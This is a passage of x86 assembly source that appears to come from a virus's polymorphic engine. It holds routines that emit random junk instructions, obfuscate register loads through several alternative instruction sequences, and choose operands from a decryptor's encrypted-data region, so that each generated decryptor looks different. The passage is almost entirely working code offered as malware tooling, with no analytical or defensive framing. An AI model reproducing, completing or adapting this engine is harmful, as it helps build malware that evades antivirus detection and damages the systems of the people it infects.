BJ_BLOCKCNT     equ   05h
iBlockJunk      endp

                ; writes two to four random junk instruction (reg or mem)
iRndJunk        proc
                pushad
                push  03h
                call  rnd32r
                inc   eax
                inc   eax
                xchg  eax, ecx
rndj_loop:      push  JUNKGEN_CNT
                call  rnd32r
                mov   eax, [ebp.JunkGen-idelta+4*eax]
                add   eax, ebp
                push  ecx
                push  ebx
                call  eax
                pop   ebx
                pop   ecx
                loop  rndj_loop
                mov   [esp], edi
                popad
                ret
iRndJunk        endp
; generates one junk instruction with the register in ebx (the register
; isn't overwritten some times)
; ebx = register
iRegJunk        proc
                push  RJ_METHCNT
                call  rnd32r
                mov   ecx, [ebp.rj_methods-idelta+4*eax]
                add   ecx, ebp
                call  iOpSizeReg
                jmp   ecx

                ; method 1: immediate operation on register
rj_meth1:       push  eax
                mov   ecx, ebx
                xor   ecx, 0FFFFFF00h xor MOD_REG
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    rj_m1_nmov
                mov   al, OPTYPE_MOV
rj_m1_nmov:
                xchg  eax, ebx
                call  rnd32
                xchg  eax, edx
                call  rnd32
                test  al, 0Ch
                jz    rj_m1_nsx
                movsx edx, dl
rj_m1_nsx:      pop   eax
rj_m1_nrc:      jmp   ciOpRMImm

                ; method 2: operation with mem on register
rj_meth2:       push  eax
                call  iGetMemory
                push  OPTYPE_MOV + 3    ; we don't want to XCHG
                call  rnd32r            ; get random operation type
                cmp   al, OPTYPE_MOV + 1
                jb    rj_m2_nmov
                mov   al, OPTYPE_MOV
rj_m2_nmov:
                mov   bh, al
                pop   eax
                mov   ah, REG_MEM
                jmp   ciOpRMReg

                ; method 3: operation with reg on register
rj_meth3:
                push  eax
rj_m3_asd:      call  rnd32
                and   al, REG_EDI
                cmp   al, bl
                je    rj_m3_asd
                xor   al, MOD_REG
                xor   bl, MOD_REG
                xchg  eax, ecx
                call  rnd32
                and   al, 01h
                jnz   rj_m3_nxchg
                xchg  bl, cl
rj_m3_nxchg:    xchg  eax, edx
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    rj_m3_nmov
                mov   al, OPTYPE_MOV
rj_m3_nmov:     mov   bh, al
                pop   eax
                mov   ah, dl
                jmp   ciOpRMReg

                ; method 4: shift register
rj_meth4:       xchg  eax, ebx
                or    al, MOD_REG
                xchg  eax, ecx
                push  ebx
                push  RND_SHIFT
                call  rnd32r
                xchg  eax, ebx
                push  SHIFT_RND
                call  rnd32r
                mov   bh, al
                call  rnd32
                and   al, 1Fh
                xchg  eax, edx
                pop   eax
                cmp   al, OPSIZE_16
                jne   rj_m4_blah1
                and   dl, 0Fh
rj_m4_blah1:    cmp   al, OPSIZE_8
                jne   rj_m4_blah2
                and   dl, 07h
rj_m4_blah2:
                mov   ah, dl
                jmp   ciShiftRM

                ; method 5: movzx/movsx register, reg
rj_meth5:       test  al, al
                jnz   rj_m5_ok
                inc   eax
                and   bl, not 04h
rj_m5_ok:       mov   dl, MOVX_WORD xor MOVX_SX
                test  al, 02h
                jz    rj_m5_nprefix
                mov   byte ptr [edi], OPERAND_SIZE
                inc   edi
                mov   dl, MOVX_SX
rj_m5_nprefix:  mov   byte ptr [edi], ESC_2BYTE
                inc   edi
                call  rnd32
                and   al, dl
                xor   al, MOVX
                stosb
                call  rnd32
                and   al, REG_EDI
                shl   ebx, 03h
                xor   eax, ebx
                xor   al, MOD_REG
                stosb
                ret

                ; method 6: inc/dec register
rj_meth6:       push  eax
                call  rnd32
                and   al, 01h
                xchg  eax, edx          ; BL = 0 [INC] BL = 1 [DEC]
                pop   eax
                test  al, al
                jnz   rj_m6_n8
                mov   byte ptr [edi], INCDEC_GROUP
                inc   edi
                xchg  eax, edx
                shl   eax, 03h
                xor   al, MOD_REG
                xor   al, bl
                stosb
                ret

rj_m6_n8:       test  al, 02h
                jz    rj_m6_noprefix
                mov   byte ptr [edi], OPERAND_SIZE
                inc   edi
rj_m6_noprefix: xchg  eax, edx
                shl   eax, 03h
                xor   al, INC_REG
                xor   al, bl
                stosb
                ret

rj_methods      equ   $
                dd    offset rj_meth1 - idelta
                dd    offset rj_meth2 - idelta
                dd    offset rj_meth3 - idelta
                dd    offset rj_meth4 - idelta
                dd    offset rj_meth5 - idelta
                dd    offset rj_meth6 - idelta
RJ_METHCNT      equ   06h
iRegJunk        endp

; write 2 - 4 register junk instructions
iRndRegJ        proc
                pushad
                push  03h
                call  rnd32r
                inc   eax
                inc   eax
                xchg  eax, ecx
                call  iGetJunkReg
                xchg  eax, ebx
irrj_loop:      push  ecx ebx
                call  iRegJunk
                pop   ebx ecx
                loop  irrj_loop
                mov   [esp], edi
                popad
                ret
iRndRegJ        endp

; memory junk generator
iMemJunk        proc
                push  MJ_METHCNT
                call  rnd32r
                mov   edx, [ebp.mj_methods-idelta+4*eax]
                add   edx, ebp
                push  OPSIZE_16 + 1
                call  rnd32r
                call  iGetWrMem
                jmp   edx

                ; immediate operation on memory
mj_meth1:       push  eax
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    mj_m1_nmov
                mov   al, OPTYPE_MOV
mj_m1_nmov:     xchg  eax, ebx
                call  rnd32
                xchg  eax, edx
                call  rnd32
                test  al, 0Ch
                jz    mj_m1_nsx
                movsx edx, dl
mj_m1_nsx:      pop   eax
mj_m1_nrc:      jmp   ciOpRMImm

                ; register operation on memory

mj_meth2:       push  eax
                push  OPTYPE_MOV + 3
                call  rnd32r
                cmp   al, OPTYPE_MOV + 1
                jb    mj_m2_nmov
                mov   al, OPTYPE_MOV
mj_m2_nmov:     mov   bh, al

                call  rnd32
                test  ah, 01h
                jz    mj_m2_rndreg
                and   al, REG_EDI
                mov   bl, al
mj_m2_rndreg:   pop   eax
                xor   ah, ah    ; MEM_REG
                jmp   ciOpRMReg

                ; shift operation on memory
mj_meth3:       push  eax
                push  RND_SHIFT
                call  rnd32r
                xchg  ebx, eax
                push  SHIFT_RND
                call  rnd32r
                mov   bh, al
                call  rnd32
                xchg  eax, edx
                pop   eax
                mov   ah, dl
                jmp   ciShiftRM

mj_methods      equ   $
                dd    offset mj_meth1 - idelta
                dd    offset mj_meth2 - idelta
                dd    offset mj_meth3 - idelta
MJ_METHCNT      equ   03h
iMemJunk        endp
; input: bl = register
; output: al = operand size, bl = register
iOpSizeReg      proc
                push  OPSIZE_16 + 1
                call  rnd32r
                test  al, al
                jnz   cr_nop
                cmp   bl, REG_ESP
                jnb   iOpSizeReg
                push  eax
                call  rnd32
                and   al, 04h
                xor   bl, al
                pop   eax
cr_nop:         ret
iOpSizeReg      endp
; input: cx, esi = memory
; output: al = operand size, cx, esi = memory
iOpSizeMem      proc
                push  OPSIZE_16 + 1
                call  rnd32r
                ret
iOpSizeMem      endp

; gets random register, parameter or junk memory operand
iGetMemory      proc
                push  eax
gm_rep:         xor   eax, eax
                mov   al, GM_METHCNT2
                cmp   byte ptr [ebp.CurrentProc-idelta], DECRYPT_DATA
                jb    gm_push
                inc   eax
                inc   eax
gm_push:        sub   al, [ebp.InLoop-idelta]
                push  eax
                call  rnd32r
                add   al, [ebp.InLoop-idelta]
                mov   eax, [ebp.gm_methods-idelta+4*eax]
                add   eax, ebp
                call  eax
                pop   eax
                ret

                ; get random parameter
gm_meth1:       movzx eax, byte ptr [ebp.CurrentProc-idelta]
                mov   al, [ebp.ProcParameters-idelta+eax] ; parameter count
                test  eax, eax
                jz    gm_m1_ebp    ; if no parameter, don't use this method
                push  eax
                call  rnd32r       ; choose random parameter
                shl   eax, 02h     ; scale to dword
                add   al, 08h      ; first dword is return address
                mov   esi, eax     ; the displacement
                mov   cx, REG_EBP  ; relative to EBP
                ret
gm_m1_ebp:      mov   cl, REG_EBP xor MOD_REG
                ret

                ; get random junk mem
gm_meth2:       mov   eax, [ebp.JunkSpSize-idelta] ; access a random dword
                shl   eax, 02h
                dec   eax
                dec   eax
                dec   eax
                push  eax
                call  rnd32r                      ; from junk memory
                add   eax, [ebp.JunkSpRVA-idelta] ; add start rva
                xchg  eax, esi
                mov   cx, MOD_DIRECT              ; return a direct address
                ret

                ; get random encrypted data
gm_meth3:       mov   eax, [ebp.CryptSize-idelta]
                shl   eax, 02h
                dec   eax
                dec   eax
                dec   eax
                push  eax
                call  rnd32r
                add   eax, [ebp.DecryptRVA-idelta]
                xchg  eax, esi
                mov   cx, MOD_DIRECT
                ret

                ; get encrypted data (RVA + 1/2/4*counter)
gm_meth4:       mov   esi, [ebp.DecryptRVA-idelta]
                push  03h                   ; scaling factor 1, 2 or 4
                call  rnd32r
                mov   ecx, eax
                push  edx
                xor   edx, edx
                inc   edx
                shl   edx, cl
                sub   esi, edx
                pop   edx
                shl   eax, 03h
                xor   al, [ebp.creg-idelta]
                mov   ch, al
                mov   cl, MOD_DIRECT
                ret

                ; get current encrypted dword
gm_meth5:       movsx cx, byte ptr [ebp.preg-idelta]  ; use [preg] without
                xor   esi, esi                        ; displacement
                ret

gm_methods      equ   $
                dd    offset gm_meth1 - idelta
                dd    offset gm_meth2 - idelta
GM_METHCNT3     equ   02h
                dd    offset gm_meth3 - idelta
GM_METHCNT2     equ   03h
                dd    offset gm_meth4 - idelta
                dd    offset gm_meth5 - idelta
GM_METHCNT1     equ   05h
iGetMemory      endp

iGetWrMem       proc
                push  eax
                push  GM_METHCNT3 - 1
                call  rnd32r
                mov   eax, [ebp.gm_methods-idelta+4+4*eax]
                add   eax, ebp
                call  eax
                pop   eax
                ret
iGetWrMem       endp


iGetPar         proc
                ret
iGetPar         endp

; common junk procedures

iGetJunkReg     proc
                push  03h
                call  rnd32r
                movzx eax, byte ptr [ebp.junkreg1-idelta+eax]
                ret
iGetJunkReg     endp

iPushJunk       proc
                pushad
                push  PP_METHCNT                ; random method to push
                call  rnd32r                    ; a parameter
                mov   eax, [ebp.pp_methods-idelta+4*eax]
                add   eax, ebp
                call  eax                       ; call da method
                mov   [esp], edi
                popad
                ret

                ; push 8-bit immediate sign 'xtended to 32-bit
pp_meth1:       mov   al, PUSH_IMM_SX
                stosb
                call  rnd32
                stosb
                ret

                ; push 32-bit immediate
pp_meth2:       mov   al, PUSH_IMM
                stosb
                call  rnd32
                xchg  eax, edx
                call  rnd32
                and   eax, edx
                stosd
                ret

                ; push register
pp_meth4:       call  rnd32
                and   al, REG_EDI
                xor   al, PUSH_REG
                stosb
                ret

                ; push memory
pp_meth3:       call  iGetMemory
                mov   al, OP_GROUP5
                stosb
                mov   bl, P_PUSH
                jmp   ciCreateOperand


pp_methods      equ   $
                dd    offset pp_meth1 - idelta
                dd    offset pp_meth2 - idelta
                dd    offset pp_meth3 - idelta
                dd    offset pp_meth4 - idelta
                dd    offset pp_meth4 - idelta
PP_METHCNT      equ   05h
iPushJunk       endp

iPopJunk        proc
                call  rnd32
                test  al, 01h
                jz    pj_asdfklj
                mov   al, POP_REG
                xor   eax, ebx
                stosb
                ret

pj_asdfklj:     test  al, 02h
                jz    pj_blahblah
                call  iGetWrMem
                mov   al, POP_MEM
                stosb
                xor   bl, bl
                jmp   ciCreateOperand

pj_blahblah:    push  04h
                pop   edx
                xor   bl, bl
                test  al, 04h
                jz    pj_sueder
                add   bl, OPTYPE_SUB
                neg   edx
pj_sueder:      mov   al, OPSIZE_32
                mov   cl, REG_ESP xor MOD_REG
                xor   ch, ch
                call  ciOpRMImm
                ret
iPopJunk        endp
; returns random dword (0..4294967295)
rnd32           proc; [no parameterz]
                push  ecx
                push  edx
                mov   eax, [ebp.RandomSeed-idelta] ; load random seed
                mov   ecx, eax
                mov   edx, eax
                not   ecx
                and   ecx, 03h          ; loop 8-64 times
                inc   ecx
                shl   ecx, 03h
rnd32_loop:     push  ecx
                mov   ecx, edx
                ror   eax, cl
                neg   eax
                rol   edx, cl
                dec   edx
                pop   ecx
rnd32_blah:     loop  rnd32_loop
                xor   eax, edx
                mov   [ebp.RandomSeed-idelta], eax ; write back random seed
                pop   edx
                pop   ecx
                ret
rnd32           endp

; returns random dword (0..[esp+4])
rnd32r          proc; [range]
                push  ecx
                push  edx
                mov   ecx, [esp+2*4+4]
                call  rnd32
                xor   edx, edx
                div   ecx
                xchg  eax, edx
                pop   edx
                pop   ecx
                ret   04h
rnd32r          endp

; 'xchanges n bytes from address ESI (n has to be pushed)
MixBytes        proc; [count] [esi = ptr]
                pushad                    ; preserve all registers
                mov   ebx, [esp.PUSHAD_SIZE+04h]
                mov   ecx, ebx
                shl   ecx, 01h            ; loop counter (2 * # of bytes)

xb_loop:        push  ebx                 ; number of bytes
                call  rnd32r              ; get first byte offset
                xchg  eax, edx
                push  ebx
                call  rnd32r              ; get second byte offset
                push  ebx                 ; preserve number
                mov   bl, [esi+eax]
                xchg  [esi+edx], bl       ; exchange bytes
                mov   [esi+eax], bl
                pop   ebx
                loop  xb_loop
                popad
                ret   04h
MixBytes        endp

; writes 1 to 4 random bytes
WriteJunk       proc
                push  eax
                push  ecx
                push  04h                 ; get random value 0..3
                call  rnd32r
                inc   eax                 ; +1 (1..4)
                xchg  ecx, eax            ; load into counter
wj_loop:        call  rnd32               ; get a random byte
                stosb                     ; store it
                loop  wj_loop
                pop   ecx
                pop   eax
                ret
WriteJunk       endp

; returns reg if it is a junk reg, otherwise -1
iIsJReg         proc
                mov   eax, [esp.04h]
                cmp   [ebp.junkreg1-idelta], al
                je    is_junkreg
                cmp   [ebp.junkreg2-idelta], al
                je    is_junkreg
                cmp   [ebp.junkreg3-idelta], al
                je    is_junkreg
                xor   eax, eax
                dec   eax
is_junkreg:     ret   04h
iIsJReg         endp

; generates TEST reg, reg/OR reg, reg/AND reg, reg
gCheckReg       proc
                ; generate MOD/RM byte with MOD_REG flag and twice the same
                ; register.
                pushad
                mov   al, bl
                xor   al, MOD_REG               ; use as register
                mov   cl, al
                xchg  eax, ebx

                mov   bh, OPTYPE_OR
                push  05h
                call  rnd32r                    ; get random value
                cmp   al, 03h
                jae   gcr_zer0
                test  al, 02h
                jz    gcr_and2
                mov   bh, OPTYPE_AND
gcr_and2:       test  al, 01h
                jz    gcr_not_test
                mov   bh, OPTYPE_TEST
gcr_not_test:   call  rnd32
                and   ah, REG_MEM               ; random direction
                mov   al, OPSIZE_32
                call  ciOpRMReg
gcr_exit2:      mov   [esp], edi
                popad
                ret
gcr_zer0:       call  rnd32
                and   al, OPTYPE_CMP
                cmp   al, OPTYPE_ADC
                jb    gcrz_1
                cmp   al, OPTYPE_AND
                jna   gcr_zer0
gcrz_1:         xchg  eax, ebx
                xor   edx, edx
                mov   al, OPSIZE_32
                call  ciOpRMImm
                jmp   gcr_exit2
gCheckReg       endp
; generates SUB reg, reg/XOR reg, reg/AND reg, 0
gClearReg       proc
                ; generate MOD/RM byte with MOD_REG flag and twice the same
                ; register.
                pushad
                mov   al, bl
                shl   al, 03h                   ; shift to REG field
                xor   al, bl                    ; write RM field
                xor   al, MOD_REG               ; use as register
                xchg  eax, ebx

                ; generate either a SUB reg, reg or XOR reg, reg
                mov   cl, MATH_SUB or OPSIZE_32
                push  03h
                call  rnd32r                    ; get random value
                test  al, 02h
                jnz   gcr_and
                test  al, 01h
                jz    gcr_not_sub
                mov   cl, MATH_XOR or OPSIZE_32
gcr_not_sub:    and   al, REG_MEM               ; random direction
                or    eax, ecx                  ; create opcode
                stosb                           ; store opcode
                xchg  eax, ebx                  ; MOD/RM byte
                stosb                           ; store
gcr_exit:       mov   [esp], edi
                popad
                ret
gcr_and:        xchg  eax, ebx
                and   al, MOD_REG xor REG_EDI
                xchg  eax, ecx
                mov   bl, OPTYPE_AND
                mov   al, OPSIZE_32
                xor   edx, edx
                call  ciOpRMImm
                jmp   gcr_exit
gClearReg       endp

; loads reg (EBX) with immediate value (EDX)
gLoadReg        proc
                mov   eax, edx
                shr   eax, 0Fh
                jnz   glr_notword

                push  03h          ; the value is 0..32767,
                call  rnd32r       ; so we can choose
                sub   al, 01h
                adc   al, 00h
glr_shift_sx:   shl   eax, 03h     ; MOVX_SX or MOVX_ZX

glr_word_val:   test  al, al
                jnz   glr_not_zx
                push  02h
                call  rnd32r
                test  eax, eax
                jz    glr_not_zx

                call  gClearReg

                push  05h                         ; ADD/OR/SUB/XOR
                call  rnd32r
                cmp   al, OPTYPE_OR
                jbe   glr_1
                add   al, OPTYPE_SUB - OPTYPE_ADC ; SUB/XOR
glr_1:          cmp   al, OPTYPE_SUB
                jne   glr_ns
                neg   edx
glr_ns:         cmp   al, OPTYPE_CMP
                jne   glr_asdf
                inc   eax
glr_asdf:       xchg  eax, ebx
                xor   al, MOD_REG
                xchg  eax, ecx
                mov   al, OPSIZE_16
                jmp   ciOpRMImm

glr_not_zx:     push  eax
                call  iGetJunkReg
                xchg  eax, ecx
                call  rnd32
                test  al, 03h      ; chance of 1:4 to use same register
                jnz   glr_blah1
                mov   ecx, ebx
glr_blah1:      mov   al, OPSIZE_16
                push  ebx
                mov   bl, OPTYPE_MOV
                xor   ecx, 0FFFFFF00h xor MOD_REG
                call  ciOpRMImm
                pop   ebx
                and   ecx, REG_EDI
                xchg  ecx, ebx
                call  iBlockJunkAR

                pop   eax
                mov   ah, ESC_2BYTE
                xor   al, MOVX xor MOVX_WORD
                xchg  ah, al
                stosw
                xchg  ecx, ebx
                xor   ecx, 0FFFFFF00h xor MOD_REG
                jmp   ciCreateOperand

glr_notword:    inc   eax
                shr   eax, 11h     ; if not zero, value is a negative word
                jnz   glr_shift_sx ; we must use MOVSX

                mov   eax, edx
                shr   eax, 10h     ; if zero, only first 16 bits are used
                jz    glr_word_val ; we must use MOVZX

                push  GLR_METHCNT       ; choose between some methods
                call  rnd32r
                mov   eax, [ebp.glr_methods-idelta+eax*4] ; load method
                add   eax, ebp          ; relocate pointer to subroutine
                jmp   eax               ; jump to method.

                ; method 1: mov reg, imm
glr_meth1:      xchg  eax, ebx                  ; get register
                xor   al, MOV_REG_IMM32         ; add opcode
                stosb                           ; store opcode
                xchg  eax, edx                  ; get immediate
                stosd                           ; store immediate
                ret

                ; method 2: clear reg; add/or/sub/xor reg, imm
glr_meth2:      call  gClearReg                   ; clear the register
                push  04h                         ; ADD/OR/SUB/XOR
                call  rnd32r
                cmp   al, OPTYPE_OR
                jbe   glr_m2_1
                add   al, OPTYPE_SUB - OPTYPE_ADC ; SUB/XOR
glr_m2_1:       cmp   al, OPTYPE_SUB
                jne   glr_m2_ns
                neg   edx
glr_m2_ns:      call  iBlockJunkAR
                xchg  eax, ebx
                or    al, MOD_REG               ; register
                xchg  eax, ecx
                mov   al, OPSIZE_32             ; 32-bit operand
                jmp   ciOpRMImm

                ; method 3: mov reg, rnd;
                ;           sub/add/xor reg, imm add/sub/xor rnd
glr_meth3:      mov   al, MOV_REG_IMM32         ; mov reg, imm32 opcode
                xor   eax, ebx                  ; add register
                stosb                           ; store it
                call  rnd32                     ; get a random dword
                stosd                           ; store it
                xchg  eax, edx                  ; random value
                xchg  eax, ecx                  ; immediate
                call  iBlockJunkAR              ; generate junk block
                push  03h                       ; add, sub, xor
                call  rnd32r
                test  eax, eax                  ; add?
                jz    glr_m3_1
                add   al, OPTYPE_SUB - 1        ; no, sub/xor
glr_m3_1:       test  eax, eax
                jnz   glr_m3_2
                neg   edx
                add   edx, ecx                  ; - random + immediate
glr_m3_2:       cmp   al, OPTYPE_SUB
                jnz   glr_m3_3
                sub   edx, ecx                  ; random - immediate
glr_m3_3:       cmp   al, OPTYPE_XOR
                jnz   glr_m3_4
                xor   edx, ecx                  ; random xor immediate
glr_m3_4:       xchg  eax, ebx
                or    al, MOD_REG
                xchg  eax, ecx
                mov   al, OPSIZE_32
                jmp   ciOpRMImm

                ; method 4: mov reg, imm ror/rol rnd;
                ;           ror/rol reg, rnd
glr_meth4:      call  rnd32
                and   al, 1Fh
                jz    glr_meth4
                xchg  eax, ecx
                xchg  eax, edx
                push  ebx
                mov   bl, ROL_SHIFT
                test  ch, 01h
                jz    glr_m4_rol
                rol   eax, cl
                inc   ebx
                jmp   glr_m4_ror
glr_m4_rol:     ror   eax, cl
glr_m4_ror:     xchg  dl, cl
                pop   ecx
                mov   byte ptr [edi], MOV_REG_IMM32
                xor   [edi], cl
                inc   edi
                stosd
                xchg  ah, dl
                xchg  ebx, ecx
                call  iBlockJunkAR
                xchg  ebx, ecx
                mov   al, OPSIZE_32
                mov   bh, SHIFT_IMM
                cmp   ah, 01h
                jnz   glr_m4_n1
                inc   bh
glr_m4_n1:      xor   ecx, 0FFFFFF00h xor MOD_REG
                jmp   ciShiftRM

glr_methods     equ   $
                dd    offset glr_meth1 - idelta
                dd    offset glr_meth2 - idelta
                dd    offset glr_meth3 - idelta
                dd    offset glr_meth4 - idelta
GLR_METHCNT     equ   04h
gLoadReg        endp
; relocates a long jump (32-bit displacement)
; [address of disp] points to the byte after the opcode
RelLongJmp      proc; [address], [address of disp]
                push  eax
                push  edi
                mov   eax, [esp.0Ch]        ; where to jump
                mov   edi, [esp.10h]        ; address of displacement
                neg   edi
                lea   eax, [eax+edi-04h]
                neg   edi
                stosd
                pop   edi
                pop   eax
                ret   08h
RelLongJmp      endp
; generates a shift instruction.
;
; AL: operand size
;       you can generate byte, word or dword operations. choose between
;       OPSIZE_8, OPSIZE_16 and OPSIZE_32. you may generate a random
;       number < OPSIZE_RND.
;
; AH: immediate shift value
;
; BL: shift type (ROL_SHIFT, SHL_SHIFT, RCR_SHIFT, ...)
;       you can use random value < RND_SHIFT
;
;
; BH: shift operand type
;       SHIFT_IMM
;       SHIFT_1
;       SHIFT_CL
;       or random value < SHIFT_RND
;
; CL: R/M operand. can be:
;       1. register (REG_??? or MOD_REG)
;       2. memory, using register as index (REG_???)
;       3. memory, immediate address (MOD_DIRECT), ESI = virtual address
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
;
; ESI: displacement
;    if this is zero, no displacement is used.
;    when usin' direct addressing (MOD_DIRECT), this register contains
;    immediate memory address.
;    if ESI is in the range between -128 and 127, 8-bit displacement is
;    used. when you're using 8-bit displacement calculate them like this:
;    movsx esi, rm8          ; rm8 = 8-bit register or memory operand
;                            ; containing 8-bit displacement.
;
ciShiftRM       proc
                pushad
                test  al, OPSIZE_16        ; check if 16-bit operand
                jz    ciSRno_prefix        ; no, we don't need a prefix
                mov   byte ptr [edi], 66h  ; write prefix
                inc   edi                  ; increment pointer
                dec   eax                  ; change operand size to 32-bit
ciSRno_prefix:  cmp   ah, 01h
                jnz   ciSRasdlkfj
                cmp   bh, SHIFT_IMM
                test  bh, bh
                jnz   ciSRasdlkfj
                mov   bh, SHIFT_1
ciSRasdlkfj:    test  bh, bh
                jz    ciSRt_imm         ; shift by immediate value
                test  bh, SHIFT_CL
                jz    ciSRt_1
                or    al, 02h
ciSRt_1:        or    al, 10h
ciSRt_imm:      or    al, OP_SHIFT
                stosb
                cmp   bl, SAR_SHIFT
                jnz   ciSRnot_sar
                inc   ebx
ciSRnot_sar:    mov   al, bh
                push  eax
                call  ciCreateOperand
                pop   eax
                test  al, SHIFT_1 or SHIFT_CL
                jnz   ciSRexit
                xchg  al, ah
                stosb
ciSRexit:       mov   [esp], edi
                popad
                ret
ciShiftRM       endp
; generates a math operation, move, compare or exchange instruction.
;
; AL: operand size
;       you can generate byte, word or dword operations. choose between
;       OPSIZE_8, OPSIZE_16 and OPSIZE_32. you may generate a random
;       number < OPSIZE_RND.
;
; AH: direction (MEM_REG, REG_MEM)
;       MEM_REG, from register to memory (write)
;       REG_MEM, from memory to register (read)
;       or random value < DIR_RND.
;
; BL: register
;     REG_??? or random value lower than REG_RND
;
; BH: operation type
;       the following operations are generated:
;       ADD, OR, ADC, SBB, AND, SUB, XOR, CMP, MOV, XCHG, TEST
;       use the corresponding OPTYPE_??? constant as operation type.
;       you can also use a random number lower than OPTYPE_RND constant.
;
; CL: R/M operand. can be:
;       1. register (REG_??? or MOD_REG)
;       2. memory, using register as index (REG_???)
;       3. memory, immediate address (MOD_DIRECT), ESI = virtual address
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
;
; ESI: displacement
;    if this is zero, no displacement is used.
;    when usin' direct addressing (MOD_DIRECT), this register contains
;    immediate memory address.
;    if ESI is in the range between -128 and 127, 8-bit displacement is
;    used. when you're using 8-bit displacement calculate them like this:
;    movsx esi, rm8          ; rm8 = 8-bit register or memory operand
;                            ; containing 8-bit displacement.
ciOpRMReg       proc
                pushad
                cmp   al, OPSIZE_16         ; check if 16-bit operand
                jnz   ciORRno_prefix        ; no, we don't need a prefix
                mov   byte ptr [edi], 66h   ; write prefix
                inc   edi                   ; increment pointer
                dec   eax                   ; change operand size to 32-bit

ciORRno_prefix: cmp   bh, OPTYPE_TEST       ; check if TEST instruction
                jnz   ciORRlame1
                mov   bh, 090h              ; real opcode ROR 3
                xor   ah, ah                ; we can only use MEM_REG
ciORRlame1:     cmp   bh, OPTYPE_XCHG       ; check if XCHG instruction
                jnz   ciORRlame2
                mov   bh, 0D0h              ; real opcode ROR 3
                test  al, al                ; check if 8-bit operand
                jz    ciORRlame2            ; next 2 checkz are obsolete

                mov   dl, cl
                and   dl, MOD_REG
                cmp   dl, MOD_REG
                jnz   ciORRblah

                xchg  cl, bl
                test  cl, cl                 ; check if reg field is eax
                jz    ciORRxchgeax           ; yes, generate xchg eAX, ??
                xchg  bl, cl
                cmp   cl, REG_EAX or MOD_REG ; check if r/m field is eax
                jnz   ciORRlame2
ciORRxchgeax:   test  cl, MOD_DISP8
                jz    ciORRblah
                test  cl, MOD_DISP32
                jz    ciORRblah

                mov   al, bl                ; BL contains reg
                and   al, 3Fh               ; clear MOD_REG bits
                or    al, XCHG_EAX_REG      ; generate opcode
                stosb                       ; store opcode
                jmp   ciORRexit             ; done! we saved one byte, but
                                            ; poly engine grows 25 bytes :p
ciORRblah:
ciORRlame2:     cmp   bh, OPTYPE_MOV          ; check if MOV instruction
                jnz   ciORRlame3
                mov   bh, 011h                ; real opcode ROR 3
ciORRlame3:     shl   ah, 1
                or    al, ah                  ; operand size + direction
                rol   bh, 03h                 ; operation number ROL 3
                or    al, bh
                stosb                         ; store opcode
                call  ciCreateOperand         ; create R/M byte
ciORRexit:      mov   [esp], edi
                popad
                ret
ciOpRMReg       endp
; generates a math operation, move or compare instruction.
;
; AL: operand size
;       you can generate byte, word or dword operations. choose between
;       OPSIZE_8, OPSIZE_16 and OPSIZE_32. you may use random operand size
;       (random number must be lower than OPSIZE_RND)
;
; BL: operation type
;       the following operations are generated:
;       ADD, OR, ADC, SBB, AND, SUB, XOR, CMP, MOV, XCHG, TEST
;       use the corresponding OPTYPE_??? constant as operation type.
;       you can also use a random number lower than OPTYPE_RND constant.
;
;
; CL: R/M operand. can be:
;       1. register (REG_??? or MOD_REG)
;       2. memory, using register as index (REG_???)
;       3. memory, immediate address (MOD_DIRECT), ESI = virtual address
;
;       hey, you'd bet right! here you can also use random value! :I
;       REG_RND for random register (don't forget to set MOD_REG),
;       REG_RND for random index reg
;       and finally MEM_RND for random index reg, but also direct
;       addressing (means no index reg is used, but memory address)
;
; CH: second index register + scaling factor
;       REG_??? + NO_SCALE / SCALE_2/4/8
;       (use random value < SCALE_RND, to get random register & scaling).
;       if this byte is zero, no SIB byte is used.
;       take special care when using no scaling factor (logical or with
;       NO_SCALE)
; EDX/DX/DL: immediate value
;
; ESI: displacement or immediate address
;
; if operation is MOV and operand is register, generate MOV reg, imm8/16/32
; if operation is MOV and operand is memory, generate MOV mem, imm8/16/32
; if operation is TEST, generate TEST r/m, imm8/16/32
; if operand is register and register is EAX/AX/AL, no R/M byte is used.
; (other opcode)
;
ciOpRMImm       proc
                pushad
                push  edx
                mov   edx, eax
                cmp   al, OPSIZE_16        ; are we usin' 16-bit operands?
                jnz   ciORIno_prefix       ; no, we don't need a prefix.
                mov   byte ptr [edi], 66h  ; store prefix
                inc   edi
                dec   eax

                ; check for MOV operation

ciORIno_prefix: cmp   bl, OPTYPE_MOV         ; MOV operation?
                jnz   ciORInot_mov           ; no, check next

                ; check if operand is register

                push  eax                    ; push operand size.
                mov   eax, ecx
                xor   al, MOD_REG            ; invert MOD_??? bits
                test  al, MOD_REG            ; they aren't 00 now?
                jnz   ciORInot_reg           ; operand is not register
                pop   ecx                    ; pop operand size
                shl   cl, 03h                ; generate B0h or B8h opcode
                or    al, cl                 ; register OR operand size
                or    al, MOV_REG_IMM
                stosb                        ; store opcode
                jmp   ciORIwrite_imm         ; write immediate

                ; generate MOV mem, imm

ciORInot_reg:   pop   eax                    ; pop operand size
                or    al, MOV_MEM_IMM
                stosb
                xor   ebx, ebx
                jmp   ciORIcreate_rm

                ; Check for TEST operation

ciORInot_mov:   cmp   bl, OPTYPE_TEST        ; TEST operation?
                jnz   ciORInot_test          ; no, check next
                cmp   cl, REG_EAX or MOD_REG ; reg = EAX/AX/AL?
                jnz   ciORInot_eax1
                or    al, TEST_EAX_IMM       ; generate TEST eAX/AL, imm
                stosb
                jmp   ciORIwrite_imm

ciORInot_eax1:  or    al, OP_GROUP3          ; opcode for operation group 3
                stosb                        ; store
                xor   bl, bl                 ; TEST r/m, Ib/Iv
                jmp   ciORIcreate_rm

                ; check if EAX/AX/AL register.
                ; if yes, we can generate opcode by shifting left operation
                ; type by 03h, adding 04h and adding operand size.

ciORInot_test:
                ; if all above fails, generate operation from immediate
                ; group (group 1). opcode 80h or operand size.
                ; if it is a 32-bit immediate, we check if immediate value
